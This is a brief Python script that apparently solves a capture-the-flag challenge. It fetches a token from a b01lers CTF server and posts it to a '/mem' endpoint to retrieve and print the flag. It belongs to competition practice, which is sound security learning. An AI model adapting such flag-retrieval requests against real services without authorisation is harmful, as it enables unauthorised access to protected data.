#!/usr/bin/env python3
import requests

url = "http://chal.ctf.b01lers.com:3001"
token = requests.get(url + "/token").text
flag = requests.post(url + "/mem", data={"token": token}).text
print(flag.rstrip())
